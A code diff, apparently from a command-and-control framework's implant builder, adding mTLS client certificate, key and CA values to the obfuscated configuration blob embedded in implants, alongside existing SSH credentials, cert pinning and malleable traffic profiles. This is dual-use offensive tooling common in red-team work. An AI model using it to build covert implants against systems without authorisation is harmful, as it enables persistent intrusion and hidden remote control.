@@ -53,6 +53,9 @@ type agentConfigJSON struct {
 	SSHPassword      string `json:"ssh_password"`
 	SSHKey           string `json:"ssh_key"`
 	SSHHostKey       string `json:"ssh_host_key"`
+	MTLSCert         string `json:"mtls_cert"`
+	MTLSKey          string `json:"mtls_key"`
+	MTLSCA           string `json:"mtls_ca"`
 	PinnedCertSHA256 string `json:"pinned_cert"`
 	SelfCheckSHA256  string `json:"self_check"`
 	MalleablePrepend string `json:"malleable_prepend"`
@@ -139,6 +142,7 @@ func obfuscateBlobKeyed(plaintext, key []byte) string {
 // buildConfigBlobKeyed serializes the resolved implant configuration into the
 // obfuscated runtime config block that the agent decodes during init().
 func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
+	mtlsCertB64, mtlsKeyB64, mtlsCAB64 := mtlsBlobValues(cfg)
 	// Bootstrap-only compile: embed only what the agent needs to reach the
 	// server and register — its per-implant secret plus the initial C2
 	// endpoint. The full network config is then delivered over the wire at
@@ -161,6 +165,12 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 			MalleableRequestPrepend: cfg.MalleableRequestPrepend,
 			MalleableRequestAppend:  cfg.MalleableRequestAppend,
 			MalleableRequestHeaders: cfg.MalleableRequestHeaders,
+			// Client credentials are needed to reach the initial endpoint when
+			// it requires a client certificate, so the bootstrap build keeps
+			// them even though everything else moves over the wire later.
+			MTLSCert: mtlsCertB64,
+			MTLSKey:  mtlsKeyB64,
+			MTLSCA:   mtlsCAB64,
 		}
 		raw, err := json.Marshal(bc)
 		if err != nil {
@@ -241,6 +251,9 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 		SSHPassword:             cfg.SSHPassword,
 		SSHKey:                  cfg.SSHKey,
 		SSHHostKey:              cfg.SSHHostKey,
+		MTLSCert:                mtlsCertB64,
+		MTLSKey:                 mtlsKeyB64,
+		MTLSCA:                  mtlsCAB64,
 		PinnedCertSHA256:        cfg.PinnedCertSHA256,
 		SelfCheckSHA256:         cfg.SelfCheckSHA256,
 		MalleablePrepend:        cfg.MalleablePrepend,
@@ -346,4 +359,18 @@ func marshalConfigBlobJSONWithPad(cfg ImplantConfig, profile MalleableProfile, p
 	// out is {"pad":"..."} — splice inner content.
 	frag := strings.TrimPrefix(strings.TrimSuffix(string(out), "}"), "{")
 	return []byte(inner + sep + frag + "}")
+}
+
+// mtlsBlobValues base64-encodes the optional mTLS PEM material for the config
+// blob. The blob carries exactly what the agent's -X main.MTLS*Str values
+// expect, so the agent-side decode is identical for generated and hand-built
+// binaries. Empty inputs stay empty (the agent then skips client auth).
+func mtlsBlobValues(cfg ImplantConfig) (certB64, keyB64, caB64 string) {
+	enc := func(pem string) string {
+		if pem == "" {
+			return ""
+		}
+		return base64.StdEncoding.EncodeToString([]byte(pem))
+	}
+	return enc(cfg.MTLSCertPEM), enc(cfg.MTLSKeyPEM), enc(cfg.MTLSCAPEM)
 }
